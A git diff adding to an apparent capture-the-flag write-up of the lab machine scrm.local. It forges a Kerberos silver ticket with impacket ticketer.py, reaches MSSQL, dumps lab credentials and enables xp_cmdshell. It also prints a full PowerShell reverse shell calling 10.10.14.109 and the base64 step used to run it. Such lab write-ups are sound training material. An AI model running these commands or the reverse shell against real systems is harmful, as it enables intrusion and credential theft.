@@ -99,13 +99,137 @@ Because the sqlsvc is not a network administrator we can not access the mssql se
 export KRB5CCNAME=~$(pwd)/sqlsvc.ccache
 ```
 
-But we have potential for silver ticket from the using getTGT:
+But we have silver ticket from the using getTGT:
 ![](silverticketerino.png)
 
+We need Domain SID; I tried enum4linux with both sets credential, which failed. getPac did not work for me, but this was due to how I had configured my /ect/hosts file
 
+```bash
+getPac.py -targetUser Administrator scrm.local/ksimpson:ksimpson
+```
+
+Domain SID: S-1-5-21-2743207045-1827831105-2542523200
+
+Discovered: 
+https://wadcoms.github.io/ - like LOLBAS or GTFObins is curated list of offensive security tools and their respective commands, to be used against Windows/AD environments.
+https://codebeautify.org/ntlm-hash-generator - NTLM generator!
+
+![](wowsantlm.png)
+
+`Pegasus60 : B999A16500B87D17EC7F2E2A68778F05`
+
+```bash
+ticketer.py -nthash <krbtgt/service nthash> -domain-sid <your domain SID> -domain <your domain FQDN> baduser
+```
+
+Now with the fields, Remember the OBJECTIVES! We need Adminnistrator level access to access the mssql server.
+```bash
+ticketer.py -nthash B999A16500B87D17EC7F2E2A68778F05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -dc-ip 10.129.24.213 -spn MSSQLSvc/dc1.scrm.local Administrator
+```
+
+![](ticketingforsilver.png)
+
+```bash
+export KRB5CCNAME=Administrator.ccache
+impacket-mssqlclient -no-pass -k scrm.local/Administrator@dc1.scrm.local
+```
+
+![](mssqlfoothold.png)
+It was in fact not necessary to impersonate Administrator.
+
+![](mssqlenuming.png)
+
+Some of the command used above listed below
+```sql
+SELECT @@version					 	-- version check
+SELECT DB_NAME()						-- current database
+SELECT name FROM master..sysdatabases;	-- list databases
+
+SELECT name, database_id, create_date FROM sys.databases;
+
+USE ScrambleHR
+SELECT * FROM information_schema.tables;
+SELECT * FROM UserImport;
+```
+
+The Scrambled Eggs in the Database
+![](ldappass.png)
+`MiscSvc : ScrambledEggs9900`
+
+![](enableandrunski.png)
+
+We can get `systeminfo` from `xp_cmdshell`
+```powershell
+Host Name:                 DC1
+OS Name:                   Microsoft Windows Server 2019 Standard
+OS Version:                10.0.17763 N/A Build 17763
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Primary Domain Controller
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:
+Product ID:                00429-00521-62775-AA258
+Original Install Date:     26/01/2020, 17:53:40
+System Boot Time:          10/12/2022, 17:23:29
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               x64-based PC
+Processor(s):              2 Processor(s) Installed.
+                           [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2295 Mhz
+                           [02]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2295 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-gb;English (United Kingdom)
+Input Locale:              en-gb;English (United Kingdom)
+Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
+Total Physical Memory:     4,095 MB
+Available Physical Memory: 2,545 MB
+Virtual Memory: Max Size:  4,799 MB
+Virtual Memory: Available: 3,210 MB
+Virtual Memory: In Use:    1,589 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    scrm.local
+Logon Server:              N/A
+Hotfix(s):                 N/A
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: vmxnet3 Ethernet Adapter
+                                 Connection Name: Ethernet0 2
+                                 DHCP Enabled:    Yes
+                                 DHCP Server:     10.129.0.1
+                                 IP address(es)
+                                 [01]: 10.129.24.213
+                                 [02]: fe80::5cf9:aac4:eb30:8f23
+                                 [03]: dead:beef::5cf9:aac4:eb30:8f23
+                                 [04]: dead:beef::116
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+
+```
+
+Alh4zr3d's obfuscate reverse shell is just this with the variables changed
+```powershell
+$client = New-Object System.Net.Sockets.TCPClient('10.10.14.109',88);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+He then base64, lttle endians it: convert it to UTF-16LE, which the Windows Default encoding, encodes it to base64 then removes the newline .
+```bash
+iconv -f ASCII -t UTF-16LE $reverseshell.txt | base64 | tr -d "\n"
+```
 
 
 ## Foothold
+
+Then in MsSQL we then use `powershell -enc $outputFromComandAbove`
+![](hurray.png)
+
+We should always run `whoami /all or priv`
+![](whoamiAll.png)
+
+[JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG) and the [Blog](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
+
+3:07 - https://www.youtube.com/watch?v=-ulAAiUzQu0
+
 
 ## PrivEsc
 
